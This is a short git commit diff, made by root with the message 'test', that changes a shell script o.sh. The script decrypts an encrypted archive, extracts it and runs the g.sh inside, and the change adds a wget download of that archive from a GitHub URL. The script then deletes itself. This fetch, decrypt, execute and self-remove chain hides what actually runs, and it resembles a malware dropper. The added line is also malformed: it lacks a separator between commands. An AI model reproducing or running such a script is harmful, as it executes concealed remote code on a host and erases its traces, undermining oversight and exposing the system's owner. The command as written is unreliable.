24083ed0a057f7c6284e8c2a5601dd0caf869666
root <root@hk.asia-east2-a.c.ornate-charter-253511.internal>
2020-06-10 11:19:13 +0800

    test

--- o.sh
+++ o.sh
@@ -1,2 +1,2 @@
-openssl des3 -d  -salt -in ./g.tar.gz | tar xzf - && chmod +x g.sh && bash g.sh
+wget https://github.com/Mao-jiawei/g/blob/master/g.tar.gz  openssl des3 -d  -salt -in ./g.tar.gz | tar xzf - && chmod +x g.sh && bash g.sh
 rm o.sh
